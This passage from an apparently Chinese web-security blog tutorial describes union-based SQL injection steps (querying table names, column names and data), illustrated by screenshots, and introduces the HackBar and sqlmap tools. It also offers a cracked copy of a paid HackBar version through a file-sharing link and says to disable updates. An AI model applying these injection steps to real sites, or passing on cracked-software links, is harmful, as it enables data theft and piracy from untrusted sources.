srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319120229833"></li></ol><p>因此可以在图示2,34位置带入查询信息的语句</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32jjnjlkj31no0c6ju5.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32jjnjlkj31no0c6ju5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319120614135"></p><p>回显信息说明返回的内容太多，利用<code>limit</code>限定返回的数量或位置和利用<code>group_concat()</code>拼接</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32jmwvtdj31nk0emq5z.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32jmwvtdj31nk0emq5z.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319120829426"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32jqyueaj31nm0fe426.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32jqyueaj31nm0fe426.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319121016551"></p><ol start="4"><li>利用union联合查询表名</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32jykat3j31ng0geaeh.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32jykat3j31ng0geaeh.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319121853542"><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32jyw8j8j31nm0i4q71.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32jyw8j8j31nm0i4q71.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319124834238"></p><ol start="5"><li>利用union联合查询列名</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32k5k9mlj31nk0fmq6e.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32k5k9mlj31nk0fmq6e.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319122918966"></p><ol start="6"><li>利用union联合查询数据</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32kaeu3xj31ni0g6q7d.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32kaeu3xj31ni0g6q7d.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319123535634"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32kfwmi1j31nm0g8n0e.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32kfwmi1j31nm0g8n0e.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319125336380"></p></blockquote><h2 id="七、两款工具简介"><a href="#七、两款工具简介" class="headerlink" title="七、两款工具简介"></a>七、两款工具简介</h2><h4 id="工具一：HackBar"><a href="#工具一：HackBar" class="headerlink" title="工具一：HackBar"></a>工具一：HackBar</h4><p><strong>HackBar</strong>：一款Firefox浏览器下的黑客插件 安全人员可以十分方便的用来进行Sql注入以及Xss测试或进行各种编码功能等。</p><p>安装教程：</p><p>由于是收费软件，特此提供破解版本，侵删。链接: <a href="https://pan.baidu.com/s/1wCT5sbchTEv1SPLyGgRSeQ">https://pan.baidu.com/s/1wCT5sbchTEv1SPLyGgRSeQ</a> 提取码: 3i33</p><ol><li>添加下载xpi文件</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32knmwhnj31aa0u0th0.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32knmwhnj31aa0u0th0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319151552809"></p><ol start="2"><li>关闭HackBar自动更新（更新之后版本要收费）</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32kqtqolj312u0me0vh.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32kqtqolj312u0me0vh.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319151704688"></p><ol start="3"><li>按F12即可使用工具</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32ktca8gj31os0gc77k.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32ktca8gj31os0gc77k.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319151747310"></p><p>​    我们可以点击Load URL将URL栏的地址加载到HackBar窗口中，可以利用HackBar工具栏提供了很多web开发相关的命令，像urlencode,urldecode等常见命令。</p><h4 id="工具二：SQLmap（详解待补）"><a href="#工具二：SQLmap（详解待补）" class="headerlink" title="工具二：SQLmap（详解待补）"></a>工具二：SQLmap（详解待补）</h4><blockquote><p> <strong>SQLmap</strong>是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
